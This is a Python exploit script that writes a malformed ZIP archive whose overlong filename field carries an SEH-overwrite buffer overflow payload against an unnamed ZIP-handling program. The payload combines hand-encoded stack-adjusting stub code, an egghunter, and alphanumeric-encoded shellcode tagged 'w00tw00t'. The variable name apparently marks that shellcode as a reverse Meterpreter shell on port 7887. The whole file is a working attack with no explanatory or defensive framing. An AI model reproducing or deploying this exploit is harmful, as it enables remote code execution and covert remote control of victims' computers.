#!/usr/bin/env python

from os import remove
from struct import pack

filename = "stacktrac3_b00m.zip"
max_size = 4064
nseh_offset = 294
split = 171

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

rev_met_7887 =  "w00tw00t"
rev_met_7887 += "\x89\xe2\xdb\xd2\xd9\x72\xf4\x5d\x55\x59\x49"
rev_met_7887 += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43"
rev_met_7887 += "\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50"
rev_met_7887 += "\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
rev_met_7887 += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38"
rev_met_7887 += "\x41\x42\x75\x4a\x49\x49\x6c\x4d\x38\x4e\x62"
rev_met_7887 += "\x33\x30\x33\x30\x73\x30\x63\x50\x6b\x39\x78"
rev_met_7887 += "\x65\x75\x61\x6b\x70\x30\x64\x6c\x4b\x56\x30"
rev_met_7887 += "\x46\x50\x6e\x6b\x36\x32\x54\x4c\x4c\x4b\x51"
rev_met_7887 += "\x42\x67\x64\x6e\x6b\x63\x42\x56\x48\x76\x6f"
rev_met_7887 += "\x4f\x47\x30\x4a\x75\x76\x45\x61\x69\x6f\x4e"
rev_met_7887 += "\x4c\x45\x6c\x73\x51\x61\x6c\x65\x52\x54\x6c"
rev_met_7887 += "\x61\x30\x7a\x61\x38\x4f\x46\x6d\x67\x71\x78"
rev_met_7887 += "\x47\x39\x72\x4a\x52\x31\x42\x42\x77\x4e\x6b"
rev_met_7887 += "\x53\x62\x62\x30\x6c\x4b\x73\x7a\x57\x4c\x4e"
rev_met_7887 += "\x6b\x30\x4c\x42\x31\x33\x48\x68\x63\x61\x58"
rev_met_7887 += "\x46\x61\x48\x51\x56\x31\x6c\x4b\x36\x39\x61"
rev_met_7887 += "\x30\x73\x31\x4e\x33\x6c\x4b\x32\x69\x42\x38"
rev_met_7887 += "\x7a\x43\x55\x6a\x71\x59\x6e\x6b\x30\x34\x6e"
rev_met_7887 += "\x6b\x65\x51\x5a\x76\x50\x31\x49\x6f\x4c\x6c"
rev_met_7887 += "\x39\x51\x4a\x6f\x76\x6d\x56\x61\x4f\x37\x54"
rev_met_7887 += "\x78\x6d\x30\x33\x45\x78\x76\x46\x63\x51\x6d"
rev_met_7887 += "\x5a\x58\x67\x4b\x51\x6d\x36\x44\x61\x65\x48"
rev_met_7887 += "\x64\x43\x68\x6c\x4b\x62\x78\x77\x54\x46\x61"
rev_met_7887 += "\x7a\x73\x51\x76\x6e\x6b\x34\x4c\x62\x6b\x4c"
rev_met_7887 += "\x4b\x46\x38\x55\x4c\x35\x51\x49\x43\x6c\x4b"
rev_met_7887 += "\x63\x34\x4c\x4b\x76\x61\x4e\x30\x4e\x69\x72"
rev_met_7887 += "\x64\x74\x64\x45\x74\x61\x4b\x51\x4b\x70\x61"
rev_met_7887 += "\x63\x69\x42\x7a\x73\x61\x79\x6f\x39\x70\x63"
rev_met_7887 += "\x6f\x63\x6f\x73\x6a\x6c\x4b\x77\x62\x78\x6b"
rev_met_7887 += "\x4e\x6d\x33\x6d\x52\x48\x76\x53\x44\x72\x63"
rev_met_7887 += "\x30\x75\x50\x35\x38\x63\x47\x70\x73\x54\x72"
rev_met_7887 += "\x53\x6f\x36\x34\x73\x58\x72\x6c\x43\x47\x57"
rev_met_7887 += "\x56\x33\x37\x4c\x49\x39\x78\x49\x6f\x68\x50"
rev_met_7887 += "\x6f\x48\x4a\x30\x63\x31\x75\x50\x43\x30\x71"
rev_met_7887 += "\x39\x68\x44\x46\x34\x76\x30\x45\x38\x45\x79"
rev_met_7887 += "\x6d\x50\x42\x4b\x37\x70\x39\x6f\x48\x55\x32"
rev_met_7887 += "\x4a\x47\x7a\x72\x48\x6c\x6c\x72\x30\x6b\x70"
rev_met_7887 += "\x4f\x5a\x33\x58\x73\x32\x73\x30\x35\x4e\x48"
rev_met_7887 += "\x4f\x6b\x39\x6b\x56\x46\x30\x72\x70\x66\x30"
rev_met_7887 += "\x32\x70\x33\x70\x42\x70\x53\x70\x56\x30\x50"
rev_met_7887 += "\x68\x38\x6a\x76\x6f\x6b\x6f\x49\x70\x59\x6f"
rev_met_7887 += "\x6b\x65\x7a\x37\x73\x5a\x42\x30\x70\x56\x30"
rev_met_7887 += "\x57\x30\x68\x6e\x79\x6c\x65\x43\x44\x61\x71"
rev_met_7887 += "\x49\x6f\x58\x55\x4d\x55\x39\x50\x52\x54\x47"
rev_met_7887 += "\x7a\x6b\x4f\x30\x4e\x66\x68\x50\x75\x78\x6c"
rev_met_7887 += "\x6d\x38\x75\x37\x45\x50\x53\x30\x33\x30\x71"
rev_met_7887 += "\x7a\x45\x50\x30\x6a\x44\x44\x32\x76\x66\x37"
rev_met_7887 += "\x31\x78\x33\x32\x59\x49\x58\x48\x71\x4f\x6b"
rev_met_7887 += "\x4f\x7a\x75\x6f\x73\x38\x78\x63\x30\x43\x4e"
rev_met_7887 += "\x66\x56\x4c\x4b\x45\x66\x43\x5a\x37\x30\x52"
rev_met_7887 += "\x48\x35\x50\x56\x70\x73\x30\x45\x50\x61\x46"
rev_met_7887 += "\x42\x4a\x57\x70\x52\x48\x72\x78\x4e\x44\x43"
rev_met_7887 += "\x63\x4d\x35\x79\x6f\x4e\x35\x6e\x73\x53\x63"
rev_met_7887 += "\x70\x6a\x75\x50\x42\x76\x70\x53\x70\x57\x51"
rev_met_7887 += "\x78\x74\x42\x6a\x79\x4a\x68\x53\x6f\x4b\x4f"
rev_met_7887 += "\x4e\x35\x4f\x73\x6a\x58\x63\x30\x51\x6d\x64"
rev_met_7887 += "\x68\x56\x38\x63\x58\x57\x70\x63\x70\x37\x70"
rev_met_7887 += "\x55\x50\x63\x5a\x37\x70\x42\x70\x65\x38\x66"
rev_met_7887 += "\x6b\x36\x4f\x34\x4f\x46\x50\x79\x6f\x68\x55"
rev_met_7887 += "\x72\x77\x51\x78\x51\x65\x52\x4e\x52\x6d\x51"
rev_met_7887 += "\x71\x69\x6f\x48\x55\x33\x6e\x63\x6e\x6b\x4f"
rev_met_7887 += "\x74\x4c\x46\x44\x66\x6f\x4f\x75\x44\x30\x69"
rev_met_7887 += "\x6f\x59\x6f\x59\x6f\x48\x69\x4f\x6b\x59\x6f"
rev_met_7887 += "\x59\x6f\x4b\x4f\x37\x71\x59\x53\x71\x39\x5a"
rev_met_7887 += "\x66\x43\x45\x6f\x31\x6a\x63\x6d\x6b\x58\x70"
rev_met_7887 += "\x48\x35\x6f\x52\x63\x66\x70\x6a\x45\x50\x66"
rev_met_7887 += "\x33\x69\x6f\x48\x55\x41\x41"

encoded_egg = "JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI56OqZj9oVoQRRraz7rf8jm4nGLeURzBTXoH82WP0TpRTnkyjnORUjJlocEm7yokWAA"

l33t_shit = ""
l33t_shit += "\x25\x4A\x4D\x4E\x55"   #  AND EAX,554E4D4A
l33t_shit += "\x25\x35\x32\x31\x2A"   #  AND EAX,2A313235
l33t_shit += "\x2D\x5A\x56\x4E\x55"   #  SUB EAX,554E565A
l33t_shit += "\x2D\x5A\x56\x4E\x55"   #  SUB EAX,554E565A
l33t_shit += "\x2D\x5C\x58\x50\x55"   #  SUB EAX,5550585C
l33t_shit += "\x50"                   #  PUSH EAX
l33t_shit += "\x5A"                   #  POP EDX
l33t_shit += "\x54"                   #  PUSH ESP
l33t_shit += "\x58"                   #  POP EAX

l33t_shit += "\x2D\x43\x53\x55\x55"   #  SUB EAX,55555343
l33t_shit += "\x2D\x43\x53\x55\x55"   #  SUB EAX,55555343
l33t_shit += "\x2D\x42\x53\x55\x55"   #  SUB EAX,55555342
l33t_shit += "\x50"                   #  PUSH EAX
l33t_shit += "\x5C"                   #  POP ESP

l33t_shit += "\x25\x4A\x4D\x4E\x55"   #    AND EAX,554E4D4A
l33t_shit += "\x25\x35\x32\x31\x2A"   #    AND EAX,2A313235
l33t_shit += "\x2D\x55\x5E\x24\x25"   #    SUB EAX,25245E55
l33t_shit += "\x2D\x55\x5E\x24\x25"   #    SUB EAX,25245E55
l33t_shit += "\x2D\x57\x60\x26\x25"   #    SUB EAX,25266057
l33t_shit += "\x50"                   #    PUSH EAX

payload = "A" * 26
payload += encoded_egg
payload += "A" * 28
payload += "BBBB"
payload += l33t_shit
payload += "C" * (119 - len(l33t_shit))
payload += "\x71\x9F\x70\x9F"
payload += pack("<L",0x00407a33)
payload += rev_met_7887
payload += "D" * (max_size - len(payload))
payload += ".txt"

print("[*] Size : {0} bytes".format(len(payload)))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)

